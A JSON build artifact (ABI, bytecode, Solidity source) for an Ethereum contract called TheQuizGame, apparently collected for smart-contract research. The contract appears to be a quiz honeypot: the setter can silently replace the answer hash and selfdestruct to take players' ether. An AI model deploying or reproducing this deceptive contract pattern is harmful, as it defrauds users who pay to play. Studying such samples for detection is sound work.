{
  "contractName": "TheQuizGame",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "question",
      "outputs": [
        {
          "name": "",
          "type": "string"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "Try",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_response",
          "type": "string"
        }
      ],
      "name": "StartTheGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "StopGame",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "_question",
          "type": "string"
        },
        {
          "name": "_responseHash",
          "type": "bytes32"
        }
      ],
      "name": "NewQuestion",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "newAddress",
          "type": "address"
        }
      ],
      "name": "newQuestioner",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b50610747806100206000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630e418bec1461007a5780633853682c1461011c5780633e3ee8591461014a5780633fad9ae0146101b457806359988dce14610244578063f50ab24714610287575b005b61011a600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610291565b005b61014860048036038101908080359060200190820180359060200191909192939192939050505061036d565b005b6101b2600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290803560001916906020019092919050505061044b565b005b3480156101c057600080fd5b506101c96104c8565b6040518080602001828103825283818151815260200191508051906020019080838360005b838110156102095780820151818401526020810190506101ee565b50505050905090810190601f1680156102365780820380516001836020036101000a031916815260200191505b509250505060405180910390f35b34801561025057600080fd5b50610285600480360381019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610566565b005b61028f610601565b005b600060010260025460001916141561036957806040518082805190602001908083835b6020831015156102d957805182526020820191506020810190506020830392506102b4565b6001836020036101000a0380198251168184511680821785525050505050509050019150506040518091039020600281600019169055508160009080519060200190610326929190610676565b5033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b5050565b3273ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff161415156103a757600080fd5b818160405180838380828437820191505092505050604051809103902060001916600254600019161480156103e35750670de0b6b3a764000034115b15610447573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f19350505050158015610445573d6000803e3d6000fd5b505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156104c45781600090805190602001906104b7929190610676565b5080600281600019169055505b5050565b60008054600181600116156101000203166002900480601f01602080910402602001604051908101604052809291908181526020018280546001816001161561010002031660029004801561055e5780601f106105335761010080835404028352916020019161055e565b820191906000526020600020905b81548152906001019060200180831161054157829003601f168201915b505050505081565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156105fe5780600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b50565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614151561065d57600080fd5b3373ffffffffffffffffffffffffffffffffffffffff16ff5b828054600181600116156101000203166002900490600052602060002090601f016020900481019282601f106106b757805160ff19168380011785556106e5565b828001600101855582156106e5579182015b828111156106e45782518255916020019190600101906106c9565b5b5090506106f291906106f6565b5090565b61071891905b808211156107145760008160009055506001016106fc565b5090565b905600a165627a7a7230582030a5bd0e73feefa6b767a8f07bc55df68e24aefa65e15ced2f08c8b80112a6850029",
  "source": "\n        \n        contract TheQuizGame\n        {\n            function Try(string _response) external payable {\n                require(msg.sender == tx.origin);\n                \n                if(responseHash == keccak256(_response) && msg.value>1 ether)\n                {\n                    msg.sender.transfer(this.balance);\n                }\n            }\n            \n            string public question;\n            \n            address questionSender;\n            \n            bytes32 responseHash;\n         \n            function StartTheGame(string _question,string _response) public payable {\n                if(responseHash==0x0) \n                {\n                    responseHash = keccak256(_response);\n                    question = _question;\n                    questionSender = msg.sender;\n                }\n            }\n            \n            function StopGame() public payable {\n                require(msg.sender==questionSender);\n                selfdestruct(msg.sender);\n            }\n            \n            function NewQuestion(string _question, bytes32 _responseHash) public payable {\n                if(msg.sender==questionSender){\n                    question = _question;\n                    responseHash = _responseHash;\n                }\n            }\n            \n            function newQuestioner(address newAddress) public {\n                if(msg.sender==questionSender)questionSender = newAddress;\n            }\n            \n            \n            function() public payable{}\n        }",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x28e0d54349c00607505aadc713147140fb60ea12/contracts/0x28e0d54349c00607505aadc713147140fb60ea12.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:50:02.382Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}